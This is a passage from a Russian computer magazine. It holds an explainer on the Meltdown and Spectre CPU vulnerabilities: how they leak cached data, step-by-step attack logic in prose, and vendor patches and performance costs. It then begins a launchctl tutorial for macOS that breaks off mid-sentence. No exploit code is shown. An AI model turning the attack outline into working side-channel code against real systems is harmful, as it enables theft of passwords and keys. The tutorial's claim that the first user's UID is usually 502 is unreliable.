но к популярным криптосистемам. Он также выступил соавтором иссле дова‐
ния Meltdown и Spectre.
  На сегодня продемонстрирова но три базовых сце нария использования
этих уязвимостей, которые мы подробнее разберем ниже. Важно то, что
во всех вариантах конечной целью атак является кеш. Раз ными уловками про‐
цессор вынуждают кешировать значение байта из адреса памяти, недос‐
тупного вредоносному про цес су.
  Обрати внимание: зловред не считывает сами дан ные (он не может
читать кеш в произволь ном мес те). Вмес то это го он вычисляет ошибочно
закешированные байты уже в своем адресном пространс тве, просто из-
меряя задержки чте ния в раз ных строках заранее созданного массива.
  По сути Meltdown и Spectre — это раз новид ность атаки по вре мени.
Основная разница между ними сос тоит в том, как они вызывают кеширование
данных из защищенных страниц памяти. Meltdown пользуется задержкой
в обработке исключения, а Spectre обманыва ет блоки пред сказания. Чтобы
понять эти детали, нужно освежить в памяти базовое устройство процес сора.


БОМБА ЗАМЕДЛЕННОГО ДЕЙСТВИЯ
Сама идея внеоче редного исполнения инструкций была предложена IBM
в 1963 году. Рядовые пользователи стол кну лись с ней только в 1995 году, ког‐
да появился первый Pentium Pro. С тех пор линейный конвейер канул в Лету,
а все современные про цессоры используют архи тектуру с внеочеред ным
(out‐of‐order) и одновременно упрежда ющим (или спекулятивным — specula‐
tive) механизмом исполнения команд.
   Как же это работает? Для прог раммиста все выглядит прос то. Он отпра‐
вил очередь инструкций на вход и получил ее исполнение на выходе. Однако
внутри процессора творится своя магия. Современное процессорное ядро
использует многоуровневый конвейер с нелиней ными путями. Все входящие
инструкции в нем кешируются и декодируются по нескольку штук за такт. Они
дробятся на микроопе рации, которые переупорядочиваются в собственном
буфере (ROB, Re‐Order Buﬀer). Ни одна из них не работает с реальными
адресами памяти и физичес кими регистра ми про цессора. Блок управле ния
памятью транслирует вир туальные адреса и определяет параметры доступа
к ним.
  После ROB микрооперации отправляются в станцию резервации, где
обрабатываются параллель но на раз ных исполнительных блоках. Вдобавок
современные процессоры используют раз ные типы кешей для ускорения
обработки данных, изначально загружа емых в не слишком быс трую оператив‐
ную память. Простейший кеш для инс трукций применял ся еще в 1982 году,
а кеш данных используется с 1985 года. Сейчас они оба относятся к базово‐
му кешу первого уровня (L1), помимо которо го появились L2 и L3 общего наз‐
начения.





  Блоковая диаграмма конвейера Intel Skylake / Kaby Lake (источник:
   wikichip.org)

Все эти архитек турные наворо ты соз давались для уменьшения вре мени
простоя отдельных исполнитель ных блоков процес сора. Пока один блок ожи‐
дает загрузки данных из оперативной памяти для своей инс трукции, дру гой
парал лельно обрабатывает следующие. В этом ему помогает MMU (Memory
Management  Unit) и общая архитектура конвейера, который  старается
работать на упреждение и пос тоянно подгру жает наиболее востребованные
данные в кеш.
  Ключевой момент в этой схе ме сос тоит в том, что в большинстве
процессоров все проверки легитимности исполнения инструкций и даже кон‐
троль за разделением доступа к памяти в самом MMU происходят уже на зак‐
лючительном этапе обра ботки инструкций, когда начинается выс траивание
промежуточных результатов в порядке исходной очереди команд. Запрещен‐
ные операции игнорируются (вызывают исклю чение), а невостребованные
данные при этом оста ются в кеше. Собствен но, это и есть главная
проб лема.
  В большей мере задержка ми в проверке условий и длинным забеганием
вперед по ветвям инструкций грешат процессоры Intel с длинным конвейером
(кроме Itanium и пер вых Atom), но AMD и даже ARM это тоже касается —
просто в эксплоитах для них потребуется более точный таймер, другие раз‐
меры массивов и техники забива ния кеша. Если Meltdown для них пока
не смогли убедительно вос произвести, то Spectre — вполне.





     Блоковая диаграмма конвейера AMD Zen (источник: wikichip.org)

Целых 27 лет ведущие разработчики счи тали, что скорость обработки инс‐
трукций важнее безопасности, а все проверки можно делать уже после проб‐
ного исполнения команд «на выходе» из конвейера. В том или ином виде вне‐
очередное исполне ние сегодня реализова но во всех процессорах. Из‐за
парал лельной работы исполнительных блоков задержка в обработке исклю‐
чения, лаг MMU и очистки кеша тоже есть всег да, просто в случае микроар‐
хитектуры Core они заметнее и ими проще вос поль зоваться.


MELTDOWN
Эту уязвимость независимо друг от друга описали спе циалисты из Google
Project Zero, Cyberus Technology и Грацского техничес кого университета (Авс‐
трия), а также упомяну тый выше криптограф Пол Кёхер. Вместе они обна‐
ружили универсальный способ, позволя ющий обойти разграничение адре сов
пользовательских и системных про цес сов в памяти.
   3 января 2018 года они опуб ликовали описание уязвимос ти «злонамерен‐
ная загрузка данных в кеш» CVE‐2017‐5754, которая и получила наз вание
Meltdown из‐за того, что «расплавляет» раз гра ничение доступа к страницам
памяти. Она нарушает базовый механизм безопас ности из‐за вне очередного
исполнения процессорных инструкций и упрежда ющей  загрузки данных
в кеш.
   Суть атаки такова.
 1. Зловред запускается и очищает процессорный кеш.
 2. Он создает в оперативной памяти мас сив из 256*4096 элементов.
  Номера строк массива отражают все возможные значения одного байта (0
  – 255). Массив точ но не попада ет в кеш из‐за размера и потому, что
   к нему еще не обращались.
 3. Троян объявляет переменную tmp и просит записать в нее значение бай‐
    та, хранящегося по закрытому для него адресу другого процесса. Так
   делать нельзя, но, пока MMU это выяс нит, конвейер обработает инструк‐
  цию на упреждение и подтянет запрошенные данные в кеш.
 4. Затем троян начинает выборку из своего мас сива, подставляя в качестве
  номера строки значение переменной tmp. Так тоже делать нельзя, но про‐
   верка условия вновь отло жена, а зап рошенная строка кешируется.
 5. Две последние операции в ито ге заб локируются, и вернется исключение,
   но прежде из‐за внеочередного исполнения инструкций будут обработаны
   запрещенные команды трояна и кешированы запрошенные им данные.
 6. Процессор просто отка жется затем транслировать их трояну, узнав
   от MMU о ссылке на защищенную область памяти, но не удалит их из кеша.
 7. До обработки исключения троян успеет выполнить легальную операцию —
   чтение из ранее соз данного мас сива, замеряя вре мя получения каждой
   строки. Только строка, чей номер соответс твует кешированному зна‐
   чению, прочитается быс трее других. Остальные будут загружаться из опе‐
   ративной памяти в разы медленнее.

Последовательно выполняя атаку для дру гих адресов, можно вос создать
в адресном пространстве трояна полную копию пароля, ключа или дру гих
данных в памяти, доступ к которым заблокирован.
   Вот как выглядит одна из практичес ких реализаций атаки:





Формально никаких нарушений безопасности при этом не происходит. Троян
выпол няет чтение только из своего адресного пространс тва, получая отказ
при попытке доступа к памяти дру гих процессов. Просто обработка исклю‐
чения происходит не сра зу, а запрошенные данные кешируются. Раз ница
во времени чтения собственных данных позволя ет трояну узнать, какое зна‐
чение процессор кешировал, но не дал прочитать напрямую.


SPECTRE
Уязвимость Spectre была совместно описана десятью авторами. Среди них
есть исследователи Meltdown, работу которых дополнили эксперты из отдела
криптографии Rambus и раз ных университетов.
  Данная атака более универсальна и потенциаль но имеет нес колько сце‐
нариев реализации. Авто ры приводят два наиболее очевидных:
 1. Проверка обхода границ массива CVE‐2017‐5753.
 2. Инъекция целевой ветви CVE‐2017‐5715.

Вспоминая выше устройство процессора, мы намеренно пропустили важные
элементы: модуль предска зания ветвлений (branch prediction unit) и блок
предсказания  адреса  (branch   target   predictor),  как  несущественные
для понимания механизма атаки Meltdown. Одна ко на манипуляциях с ними
основаны разные сценарии использования Spectre.
   Если сре ди инструкций встречается условный переход (if, switch), а в кон‐
вейере есть свободные исполнительные блоки (практичес ки всегда), то вари‐
анты ветвления начинают обра батывать ся еще до реальной проверки усло‐
вия. Это экономит время, потому что обычно для проверки требуется пот‐
ратить сотни процессорных тактов на загрузку данных, которые находятся
где‐то в оперативной памяти или вообще лежат в сво пе на диске.
  Процессору быстрее прос читать наиболее веро ятный вариант ветвления
заранее, а потом подставить его целиком или полностью отбросить неверную
ветвь, если вдруг предсказание окажется неверным. При этом все, что успе ло
подтянуться в кеш, в нем и оста ется.
  Проблема состоит в том, что для предсказания ветвле ний используется
статистическая модель. Про цес сор каждый раз запоминает результат про‐
верки типового усло вия и в зависимости от этого решает, какое ветвление
алгоритма будет статис тически более вероятным, начиная внеоче редное
исполнение инструкций выб ранной ветви.
  Среди этих инструкций может быть что угодно, включая чтение ключа
по известному адресу в памяти. Троян такое действие выполнить не может,
но он способен спровоцировать кеширо вание клю ча самой легитимной прог‐
раммой, просто натренировав предсказатель ветвления.
  Код современ ных программ имеет мно го шаб лонных фрагментов, поэтому
обычно у целевой программы (например, популярного менеджера паролей)
можно найти какой‐то стандартный кусок кода с пользовательским вводом
и условным переходом.
  Для первого варианта реализации Spectre пишется малварь, в которой
будет участок кода, сходный с целевым. Он «тренирует» предсказатель вет‐
влений, заставляя его много раз проверять валидность условия, аналогич‐
ного переходу в атакуемой программе.
  В своей (вредоносной) программе мы можем сделать так, что выбранное
условие всегда будет истинным. Ког да накопит ся достаточная статистика
условных переходов, блок предсказания ветвления начнет считать, что
это типовое условие, которое в большинстве случаев проходит проверку.
  При обработке инструкций атакуемой программы поведение «натрениро‐
ванного» предсказателя ветвлений станет аналогичным. Если теперь в ней
задать неверное усло вие (например, ввес ти неверный мастер‐пароль), то
она все равно начнет выполнять его как истинное. Потом, конечно, опомнится
и сбросит конвейер, замолчав как партизан, но ошибочно запрошенные дан‐
ные (ключ расшифровки) останутся в кеше.
   Техника их получения зловредом из кеша аналогична рассмотренной
в атаке Meltdown с той лишь разницей, что троян вообще не обращался к заб‐
локированной для него области памяти. Он лишь натас кал предсказатель
переходов так, что уже легитимная программа сама потащила в кеш кон‐
фиденциальные данные, не успев проверить типовое условие.
   Вторая разновидность ата ки Spectre выглядит очень похоже. Раз ница
лишь в том, что вместо модуля предска зания вет влений «трениру ется» блок
предсказания адреса с собственным буфером. Фактически атака идет на кеш
через branch target buﬀer. Он подставляет вир туальные адре са, которые нуж‐
ны для выполнения кос венных переходов. Они выполняются по какому‐то
типовому условию, которое мы имитируем в сво ей программе.
  После серии повторений буфер забивается, а блок пред сказания адреса
начинает считать, что такой учас ток кода (gadget в терминологии авторов
исследования) всегда приводит к кос венно му перехо ду по указанному адре‐
су… и начинает заранее считывать из него данные в кеш.
  Поскольку блоки предсказания и кеш есть практически во всех процес‐
сорах, атака Spectre затрагивает еще больше раз ных архитектур. Пока прак‐
тического подтверждения нет разве что для MIPS и «Эльбруса», но это еще не
означает их неуязвимости. Прос то сценарий ата ки может оказаться менее
явным.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
MELTDOWN И SPECTRE
                  РАЗБИРАЕМ ФУНДАМЕНТАЛЬНЫЕ
                   УЯЗВИМОСТИ В ПРОЦЕССОРАХ





КОНСПИРОЛОГИЧЕСКИЕ ТЕОРИИ
Некоторые обозреватели считают найденную уяз вимость троянской зак‐
ладкой, оставленной в процессорах много лет назад. Как говорилось в этой
показательной истории, основное усло вие эффективной закладки — ее мас‐
совость. В случае с Meltdown и Spectre данное условие выполняется на 101%.
   Авторы исследования допускают, что они далеко не первые, кто обна‐
ружил эту особенность. К примеру, осенью 2008 года Николай Лихачёв
(известный под псевдонимом Крис Касперски) готовился выступить на кон‐
ференции Hack In The Box с докладом о найденной им уязвимости, позволя‐
ющей взламывать компьютеры на базе процес соров Intel вне зависимости
от используемой операционной системы. Звучит похоже, не правда ли?
  «Процессоры содержат недора ботки, которые позволя ют использовать
уязвимости как непосредс твенно сидя за компь ютером, так и дистанционно,
вне зависимости от уста новленных обновлений и приложений», — писал он
в анонсе. Однако доклад так и не был представлен. Крис улетел в США, стал
работать на подконтрольную  Intel компанию McAfee, а позже разбился
при странных обстоятель ствах.
   Если наточить бритву Окка ма поос трее, то внимание на себя обратит дру‐
гой факт: уже давно предполагалось, что внеочередное исполнение команд
подрывает  базовое  разграничение  при вилегий,  известное  как  кольца
защиты. Суть этой модели безопасности в том, что отдельные процессорные
инструкции  могут выполняться  только  в наибо лее  привилегированном
нулевом кольце, где властвует ядро ОС (а также продвинутые отладчики вро‐
де SoftIce и руткиты уровня ядра).
  Следующие коль ца с номера ми один и два менее привилегированные.
Они отданы драйверам, а также гипервизорам, эму ляторам, песочницам
и прочим системам виртуализации. Что именно там будет выполняться —
зависит от ОС. Например, Windows 7 вооб ще не использует первое и второе
кольцо, ограничиваясь нулевым и третьим.
  В любой ОС все поль зовательские про цес сы запускаются в непривиле‐
гированном (обычно последнем) кольце защиты. В реальной ОС они обра‐
щаются к системным процес сам и физическим устройствам через драйверы,
а в виртуальной — через гипервизоры, когда им нужно выполнить какую‐то
из зарезервированных инструкций. Ядро ОС проверяет легитимность сис‐
темных вызовов (syscalls) и выполняет либо отклоняет запросы при ложе ния.
Чтобы далеко не бегать за данными для проверки, их часто помещают
в соседний диапазон виртуальной памяти, выделя емой пользовательскому
процессу. Просто у него стоит бит‐идентифика тор привилегий уровня ядра,
и прочитать их напрямую процесс из userspace не может.
  Например, ядро заблокирует для приложения trojan.exe или malware.js
чтение из оперативной памяти по адресам, ранее выделенным для chrome.
exe. Троян останется в сво ей песочнице и не прочитает пароли из браузера
с наскока. Чтобы сделать это, ему пришлось бы использовать какой‐то
обходной путь. Например, отдельный лоадер, который внедрит DLL в процесс
chrome.exe, повысит привилегии трояна в обход sandbox, UAС и прочих
защитных механизмов. На произвольной сис теме это сделать довольно
сложно, поэтому проще использовать соци аль ную инженерию и спровоци‐
ровать пользователя выполнить необходимые автору трояна действия вруч‐
ную. Это был приоритетный механизм атаки до появления Meltdown и Spectre.
  С новыми уязвимостями тро яну больше не нужно идти сложным путем
или рассчитывать на бес печность пользователя. Вмес то этого он использует
внеочередное  исполнение  процессорных  инструкций  для  того,  чтобы
получить в своей области памяти копию данных по любому заблокированному
адресу.


РЕАКЦИЯ ВЕНДОРОВ И ПАТЧИ-КОСТЫЛИ
Реакция на известие о фундаментальных уяз вимос тях в процессорах ока‐
залась удивительной. Исполнитель ный директор Intel Брайан Кржанич (Brian
Krzanich) узнал о проб леме летом 2017 года и на чал продавать большую
часть акций своей компании. К ноябрю 2017 года у него осталась только обя‐
зательная доля, которую нельзя продать по усло виям контракта. Пред ста‐
вители Intel долго отрицали наличие каких‐либо проблем с процес сорами,
потом называли их несущественными, а еще поз же — неохотно признали,
опубликовав попол няемый список процессоров, на которых уязвимость под‐
твердилась.
  AMD заявила, что архитектурные отличия ее про цес соров вряд ли поз‐
воляют в реальных условиях выполнить атаку Meltdown и второй вариант атаки
Spectre. Поэтому компания предлагает уста новить патчи от производителей
ОС и ПО, но только для закрытия потенциальной уяз вимости Spectre первого
типа. Основной аргумент — авто ры исследования не проверяли Meltdown
на системах с AMD, а больше никто не жаловался.
   Microsoft выпустила патч для Windows 10. Для других версий Windows
наборы исправлений можно загрузить вручную отсюда, однако не спеши
это делать.
  Про KB4056892 уже пишут, что оно вызыва ет зависание при загрузке мно‐
гих компьютеров с процес сорами AMD (в частнос ти, серии Athlon 64 X2). Его
можно откатить (если ранее была соз дана точка восстановления), а затем
отключить автоматическое обновление через gpedit.
  В Linux проблему Meltdown час тично решили набором патчей KPTI. Их
не рекомендует ся устанавливать для систем с процессорами AMD... а то
мало ли.
  Более глобальный подход  к переосмыслению механизмов изоляции
адресного пространства в Linux обсуждается здесь.
   Apple сде лала лаконичное заявление о том, что «…все сис темы Mac и iOS
уязвимы, однако пока не наб людалось реальных атак. На всякий случай заг‐
ружайте софт толь ко из доверенных источни ков, таких как App  Store».
Рекомендация выглядела бы логично, если бы не трояны, которых уже на‐
ходили в App Store.
  Обновления готовы для iOS 11.2, macOS 10.13.2 и Safari, однако после
установки све жих апдейтов на macOS 10.3.2 экспло ит для Spectre по‐преж‐
нему работает.





                   PoW Spectre на macOS

Считается, что WatchOS не требует патчей, поскольку в Apple Watch исполь‐
зуется процессор Apple S1, на котором пока не удалось реализовать ни один
из вариантов атаки Meltdown и Spectre.
   Google  сослалась  на  свой  про ект  Zero  и  выпустила  об новления
для Android. Как обычно, когда они станут доступны пользователям смартфо‐
нов и планшетов вне серий Nexus и Pixel — остается на совести сторонних
производителей. При этом компания отложила исправления в браузере
Chrome до 23 января — даты выхода версии за номером 64.
  ARM представила список уяз вимых SoC, указав в таблице модели с под‐
твержденными сценариями атак и ссылки на пат чи.
   Легко видеть, что в этот список не входят старые ядра ARM без внеоче‐
редного исполнения инструкций. Они ожидаемо оказались иммунны ми
к Meltdown и Spectre, поскольку ата ки такого рода не работают без вне оче‐
редного исполнения команд. Нап ример, это популярные Cortex‐A7, Cortex‐
A53 и семейство ARM 11. На A7 постро ен популярный одноплатный компь‐
ютер Raspberry Pi 2B, а на A53 — его более новая версия 3B. Другие версии
«малины» используют ARM 11, который также исполняет инс трукции по оче‐
реди.
  Среди мобильных устройств ядра Cortex‐A7 используются в однокрис‐
талках Qualcomm (MSM8226, MSM8626, Snapdragon 200, 210 и 400), Medi‐
atek (MT6572, MT6582, MT6589 и MT6592), Broadcom (BCM23550, BCM2836),
Allwinner (A20, A31, A83T).
  На Cortex‐A53 основаны Qualcomm Snapdragon 410, 412, 415, 425, 430, 435,
610, 615, 616 и 625 и другие популярные чипы ниж него и среднего ценового
сегмента. Более шустрые SoC всех про изво дителей уже используют ком‐
бинацию из старых (иммунных) и новых уяз вимых ядер. Например, Snapdrag‐
on 808 — это сочетание A53 + A57. На последних уда лось вос произвести оба
сценария Spectre и модифициро ванный вари ант Meltdown, который в ARM
назвали «вариант 3а».
  IBM признала проб лему и пообещала выпус тить 9 января обновления про‐
шивок для систем с процес сорами серии Power.
   Nvidia выпустила обновления драйверов GPU для Windows, Linux, FreeBSD,
Solaris.
   Mozilla подготовила хотфикс для Firefox, но чес тно предупреждает, что
это полуме ра. Аналогичный «кос тыль», затрудняющий эксплуатацию уяз‐
вимостей через браузер, уже готовят и разработ чики Chrome. Пока поль‐
зователям рекомендуют вклю чить функцию Site Isolation.
  Один из способов про верить, уязвим ли твой компьютер к Meltdown
и Spectre, — это запус тить готовый командлет для Windows PowerShell
или аналогичный скрипт на Python в Linux.
   Вот еще одна простая проверялка под Linux.


ПРОБЛЕМЫ С АНТИВИРУСАМИ
Патчи для Windows кон фликтуют со многими антивиру сами и защитными
решениями, что приводит к неполадкам в работе системы, BSOD и другим
неприятным последствиям. Дело в том, что раз работчики ряда антивирусов
использовали для работы своих продуктов весь ма спорные техники — их
можно приравнять к эксплуата ции проб лем, с которы ми и призваны бороться
новые патчи. Так, антивиру сы раз личными способа ми обходят Kernel Patch
Protection, внедряют свои гипервизоры для перехвата системных вызовов
(syscalls) и строят предположения об адресах ячеек памяти.
  В итоге разработчики  Microsoft решили проблему интерес ным спо‐
собом — обязали производителей антивирусного ПО добавлять в реестр
запись, которая даст Windows Update понять, что «все чисто» и проблем
не возникнет:


Key="HKEY_LOCAL_MACHINE" Subkey="SOFTWARE\Microsoft\Windows\Curren
tVersion\QualityCompat" Value="cadca5fe‐87d3‐4b96‐b7fb‐a231484277cc"
Type="REG_DWORD"

Сначала эта запись в реестре ста ла обязательной только при установке пат‐
чей для Meltdown и Spectre, но потом инженеры Microsoft решили, что стоит
«завернуть гайки» еще туже. Так, если записи нет в реестре, Windows не будет
устанавливать не толь ко патчи для Meltdown и Spectre, но и никакие обновле‐
ния вообще. В сущности, теперь поль зователям придется решать, что им
нужнее: обновле ния для ОС или сомнительный антивирус.
  Список совместимых и несовместимых с Windows антивирусов, регулярно
обновляемый ИБ‐специалис тами, можно найти здесь.


ПОЧЕМУ ВСЕ ПАТЧАТ ОС, ДРАЙВЕРЫ И ПРИЛОЖЕНИЯ, ЕСЛИ
ПРОБЛЕМА В ПРОЦЕССОРАХ?
Авторы иссле дования поясняют, что все выпускаемые патчи — это лишь соф‐
товые костыли, затрудняющие экс плуата цию найденных уязвимостей, а точ‐
нее даже известных сценариев их использования. Полностью устранить эти
дыры в безопасности можно только хардверным способом — выпустив новые
процессоры без внеочередной обработки инс трукций.
  Понятно, что если это и про изойдет, то не в ближайшие годы. Цикл раз‐
работки новых процессорных ядер слишком долгий для оперативного вне‐
сения исправлений, тем более — таких кардинальных.
  Поэтому производители делают то, что можно сделать в сжатые сроки, —
переписывают софт. Например, в Linux теперь память ядра не отображается
в адресное пространство пользовательских процессов. Это мешает атаке
Meltdown, но все системные вызовы ста ли выполняться дольше.
  В зависимости от осо бенностей конкретной системы существующие патчи
вызывают замедление производитель ности всех операций с обращениями
к ядру. У домашних поль зователей их доля невелика, поэтому замедление
наблюдается небольшое (2–3% в большинстве сценариев). У корпоративных
клиентов, работающих с базами данных и системами виртуализации, падение
производительности может дос тигать 30%.
  Компании Intel и Microsoft долго избегали официальных комментариев
по этому вопросу, но в конце концов все‐таки признали сущес твование проб‐
лемы. Официальное сооб щение в бло ге Microsoft, написанное исполнитель‐
ным вице‐президентом Windows and Devices Group Терри Май ерсоном (Terry
Myerson), гласит, что хуже всего придется пользователям старых ОС и про‐
цессоров.
 • Пользователи Windows 10 и новейших процессоров (2016 года, Skylake,
   Kaby Lake и новее) практичес ки не ощутят никакой потери производитель‐
   ности, так как ухудшение исчисляется счи таны ми миллисекундами.
 • Некоторые пользователи Windows 10 и более  старых процес соров
   (2015 года, включая Haswell и более старые CPU) могут обнаружить в ряде
   тестов замет ное ухудшение показа телей и даже увидеть потерю произво‐
   дительности системы.
 • Пользователи  Windows  8  и  Windows  7  (использующие  процес‐
  соры 2015 года, включая Haswell и более ста рые модели), в свою оче редь,
   столкнутся со значительной потерей производительности практически
   гарантированно.
 • В случае Windows Server (на любых процессорах), особенно если речь
   идет о работе приложений, активно использующих IO, потеря произво‐
   дительности тоже будет весьма существенной.

Также данный вопрос затронул и глава Intel Брайан Кржанич, выступая на кон‐
ференции Consumer Electronics Show в Лас‐Вегасе. Он под черкнул, что
потеря производительности существует, но она сильно зависит от загрузки
процессора и конкретных задач, которые CPU выполняет. Кржанич заверил,
что инженеры  Intel делают все воз можное, чтобы минимизировать эти
«потери».
   Как нетрудно заметить, предста вители Intel и Microsoft стараются не озву‐
чивать конкретных цифр, и их можно понять, ведь раз брос действительно
велик. Но для тех, кто любит конкретику, мы все же при ведем несколько при‐
меров.
   Разработчики Red Hat оценивают потерю производительности в 1–20%,
и конкретная цифра будет зависеть от множес тва факторов.
  Компании Epic Games и Branch Metrics пожаловались, что патчи для Melt‐
down и Spectre уже вызвали серь езные проблемы в их работе. Так, график
ниже показывает, как после установки обновлений нагрузка на один из сер‐
веров популярного сетевого шутера Fortnite возросла с 20 до 60%.





О похожих проблемах со общили и раз работчики Housemarque Games: наг‐
рузка на серверы игры Nex Machina возросла в 4–5 раз.





Тем не менее многочис ленные исследова тели уверяют, что прос тые поль‐
зователи вряд ли заметят, что их система стала работать сколь‐нибудь мед‐
леннее. В частности, очень мно гих пользователей вол нует возможное «про‐
седание» FPS в играх. Но согласно свежему тестированию Eurogamer, потери
будут совсем незначительными. К похожим выводам также пришли тестиров‐
щики портала Dark Side of Gaming.





Также можешь ознакомиться с тес тами специалис тов TechSpot, Computer‐
Base и попросту погуглить, поискав тес ты для конкретных процессоров и кей‐
сов использования, так как бенчмаркингом пос ле выхода патчей занялись
все, кто только мог.


ВЫВОД
Сейчас различные примеры PoW найденных уязвимостей быстро появляются
на GitHub. К примеру, вот вариант экс плоита Meltdown на С, а вот хорошо
откомментированный экспло ит для Spectre.
   Ставить обновле ния или нет — решать тебе. Сложность оценки риска сос‐
тоит в том, что ни Meltdown, ни Spectre не оставля ют следов в сис теме и никак
не детектируются (кроме как в лоб по извес тным сигнатурам). Сами авторы
приводят три сценария ата ки, но теоретичес ки их гораз до больше.


        WWW

                    •Первое публичное сообщение об уязвимостях
                         Meltdown и Spectre
                    •Подробное исследование Meltdown
                    •Подробное исследование Spectre
PCZONE

       КОНТРОЛИРУЕМЫЙ
  ПУСК

             АВТОМАТИЗИРУЕМ MACOS
               ПРИ ПОМОЩИ PYTHON
                     И LAUNCHCTL





  Андрей Письменный
      Шеф‐редактор
   apismenny@gmail.com





Launchctl — это утилита, которая зна кома каждому опытному
маководу, но при этом многие избе гают связываться с ней
лишний раз. А зря! Этот универсальный лаун чер — один
из важнейших компонентов системы. Изучив его настрой ки,
ты сможешь делать массу инте ресных и полезных вещей. Я
покажу три примера того, как launchctl может пригодиться
в жизни.


             INFO

                      Эта статья — уже третья из моего небольшого
                       цикла о macOS. В первой («Обвес macOS») мы
                        изучали скрытые настройки и собирали полезный
                        софт, во вто рой («Кунг‐фу для маковода») прош‐
                       лись по большинству уникальных утилит коман‐
                      дной строки. В ней я уже касался  launchctl,
                      но лишь вкратце. Что эта штука достойна отдель‐
                      ной статьи, было ясно сразу.


Благодаря гибкости нас троек launchd, этот сервис заменил в macOS целый
список более старых систем, которые пришли из Unix. Он управля ет процес‐
сом загрузки ОС и сервисов (вмес то  init), он реагирует на подключения
по сети (вместо inetd), он же запускает скрип ты по времени (вместо cron)
и при разных усло виях. Мы воспользуемся этими богаты ми возможностями
для настройки всякой автоматизации: запус ка скриптов по времени, срабаты‐
вания при помещении файла в папку, при изменении файла и при подклю‐
чении внешнего носителя.
  Я буду писать имен но про launchctl, пос кольку работаю в macOS, но если
ты предпочитаешь Linux, то можешь позаимствовать идеи и скрипты, которые
мы будем писать, и проделать все то же самое при помощи systemd. Эта сис‐
тема похожа на launchd и есть во многих современных дистрибутивах. Однако
ее настройки в корне отличаются, и парал лель но разбирать еще и их я
не возьмусь.


АГЕНТЫ И ДЕМОНЫ
Файлы с правилами — это XML с расширением .plist. Внутри содержатся инс‐
трукции, которые указывают launchd, что и когда запускать. Эти файлы раз‐
ложены в системе по пяти папкам:
 • ~/Library/LaunchAgents — агенты текущего пользователя;
 • /Library/LaunchAgents — агенты для всех пользователей;
 • /Library/LaunchDaemons — демоны для всех пользовате лей;
 • /System/Library/LaunchAgents — сис темные агенты (входят в состав
   macOS);
 • /System/Library/LaunchDaemons— сис темные демоны.

Отличие агентов от демонов довольно тонкое: демоны — это процессы,
которые запускаются сразу после загрузки машины, а агенты могут работать
только после логина в систему (соответс твенно, демонов для конкретного
пользователя не бывает). К тому же демоны пос ле активирования работают
непрерывно, а агенты обычно сра батывают при определенных условиях.
  Делать мы будем именно агенты и для личного пользования, так что пер‐
вая папка из списка подойдет как нельзя лучше.


        WWW

                     Для создания конфигурацион ных файлов launchd
                         есть пара графических оболочек — LaunchControl
                      и Lingon (обе стоят по десять долларов). Они
                         слегка облегчают дело, но можно обойтись и без
                          них.



ПРОСТОЙ КОНФИГ: ЗАПУСК ПО ВРЕМЕНИ
Начнем с самого прос того — запуска чего‐нибудь в определенное время.
Вот как выглядит один из самых простых вари антов конфига.


<?xml version="1.0" encoding="UTF‐8"?>
<!DOCTYPE plist PUBLIC "‐//Apple//DTD PLIST 1.0//EN" "http://www.
apple.com/DTDs/PropertyList‐1.0.dtd">
<plist version="1.0">
<dict>
        <key>Label</key>
        <string>название</string>
        <key>ProgramArguments</key>
        <array>
                <string>путь к файлу</string>
        </array>
        <key>StartCalendarInterval</key>
        <dict>
                <key>Minute</key><integer>30</integer>
                <key>Hour</key><integer>1</integer>
                <key>Day</key><integer>6</integer>
        </dict>
</dict>
</plist>

Несмотря на развесистый вид, структура здесь довольно несложная. Внутри
основного словаря (<dict>) идут ключи и следом — параметры к ним. Иногда
это строки, иногда массивы, иног да вло женные словари.
  Заменяй  слово  «наз вание»  на  какое‐нибудь  название  (обычно
«com.домен.имя» — я, нап ример, наз вал тестовый агент com.and.launcht‐
est), укажи путь к исполняемо му файлу в качес тве первого параметра Pro‐
gramArguments, а затем задай, во сколь ко и по каким дням запускать.





                Конфиги удоб но редактировать в Xcode

В примере выставле но время 1:30 каждую субботу. Если ты снесешь ключ
Day, скрипт нач нет запус кать ся в половине вто рого каждую ночь, а если убе‐
решь и Hour, то каждые пол часа. Думаю, ты понял идею. Аналогичная запись
в crontab выглядела бы как


0 30 1 * 6 <путь к файлу>

Если команда, которую ты запускаешь, принимает аргументы, то их нужно
перечислить после пути, добавив дополнительные поля <string>. Например:


<key>ProgramArguments</key>
<array>
        <string>say</string>
        <string>В Петропавловске‐Камчатском полночь</string>
</array>
<key>StartCalendarInterval</key>
<dict>
        <key>Minute</key><integer>0</integer>
        <key>Hour</key><integer>15</integer>
</dict>

Когда все будет готово, сохраня ем файл в ~/Library/LaunchAgents/.
Хорошей идеей будет сразу прописать в названии условия запуска, чтобы
потом было легче ориентировать ся. Например, мой тестовый конфиг я сох‐
ранил как com.and.launchtest.StartInterval.plist.


ТОНКОСТИ АКТИВАЦИИ
К сожалению, обратная сторона гибкости — это развесис тость нас троек.
Даже включать и вык лючать конфиги launchd можно несколькими способами.
Вот старый и наиболее простой. Для загрузки пиши:


$ launchctl load ‐w ~/Library/LaunchAgents/<конфиг.plist>

И для выгрузки:


$ launchctl unload ‐w ~/Library/LaunchAgents/<конфиг.plist>

Ключ ‐w заодно включает флаг  enabled,  что экономит нам один шаг
(launchctl enable) и сра зу активирует кон фиг. Помни, что после загрузки
компьютера и входа в систему все агенты, лежащие в соответствующих пап‐
ках, будут загружены автоматически. Именно поэтому при выгрузке удобно
тоже добавлять ‐w — тогда launchctl запомнит, что конфиг неактивен.


             INFO

                     После того как что‐то меня ешь в конфиге, его
                      нужно выгружать и загружать заново.


Можешь спокойно пользовать ся этими командами, однако если откроешь
man, то узнаешь, что они считаются устаревшими и поддерживаются лишь
для совместимости. Более пра вильный способ — использовать команды
bootstrap и bootout. Они требуют ука зывать, помимо пути к файлу кон‐
фигурации, domain‐target, который сос тоит из домена и UID пользователя.
Целиком команды будут выглядеть вот так:


$ launchctl bootstrap gui/<твой UID> <путь к файлу>

И для выгрузки:


$ launchctl bootout gui/<твой UID> <путь к файлу>

Узнать свой UID можешь командой id ‐u. Первый пользователь компьютера
обычно записан под номером 502.
  Другая команда, которую хорошо помнить, — это list. Чтобы проверить,
какие из твоих конфигов загружены, можешь написать:


$ launchctl list | grep <название>





Опять же — существует более современный, более прод винутый и, конечно,
более замороченный метод:


$ launchctl print <домен>/<UID>

На выходе будет куда больше информа ции, чем при запросе списка. Но опять
же, использовать print совер шенно не обя зательно. В ответ на вопрос
о том, когда устаревшие команды перес танут работать, кто‐то из разработ‐
